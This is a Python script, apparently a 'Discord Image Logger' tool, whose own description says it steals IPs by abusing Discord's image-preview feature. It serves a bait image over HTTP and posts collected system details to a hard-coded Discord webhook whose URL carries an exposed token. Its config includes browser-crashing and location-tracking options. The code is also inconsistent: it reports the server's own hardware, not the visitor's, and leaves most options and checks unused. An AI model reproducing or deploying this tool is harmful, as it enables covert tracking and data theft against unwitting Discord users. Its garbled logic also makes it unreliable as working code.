import platform
import psutil
import GPUtil
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    "webhook": "https://discord.com/api/webhooks/1342288677933682738/E1-ketzyFaa1K7n22KWVK7dpwaZH2dJREzTUYACJ8JO4sEfkeM8SJE7r41wr_h8Q06KX",
    "image": "https://www.sarzamindownload.com/upload_chs1/image/sdlftpuser/98/03/Zola2.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    }
}

blacklistedIPs = ("27", "104", "143", "164")

def get_device_info():
    try:
        os_info = platform.system() + " " + platform.release()
        cpu_info = platform.processor() or "Unknown CPU"
        ram_info = f"{round(psutil.virtual_memory().total / (1024.0 ** 3))} GB"
        
        gpus = GPUtil.getGPUs()
        gpu_info = gpus[0].name if gpus else "N/A"

        return {
            "OS": os_info,
            "CPU": cpu_info,
            "RAM": ram_info,
            "GPU": gpu_info
        }
    except Exception as e:
        return {"Error": f"Failed to get device info: {str(e)}"}

def send_device_info():
    device_info = get_device_info()
    try:
        response = requests.post(config["webhook"], json={
            "username": config["username"],
            "embeds": [
                {
                    "title": "Device Information",
                    "color": config["color"],
                    "description": f"""
                    **OS:** `{device_info.get('OS', 'Unknown')}`
                    **CPU:** `{device_info.get('CPU', 'Unknown')}`
                    **RAM:** `{device_info.get('RAM', 'Unknown')}`
                    **GPU:** `{device_info.get('GPU', 'Unknown')}`
                    """
                }
            ]
        })
        if response.status_code != 204:
            print(f"Error sending device info: {response.status_code}, {response.text}")
    except Exception as e:
        print(f"Error sending device info: {str(e)}")

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            send_device_info()
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Device info sent to Discord Webhook!")
        except Exception:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            traceback.print_exc()
    
    do_GET = handleRequest
    do_POST = handleRequest

def botCheck(ip, useragent):
    if not useragent:
        return False
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def is_blacklisted(ip):
    return any(ip.startswith(prefix) for prefix in blacklistedIPs)

def start_server():
    server = HTTPServer(("0.0.0.0", 8080), ImageLoggerAPI)
    print("Server started on port 8080...")
    server.serve_forever()

if __name__ == "__main__":
    start_server()
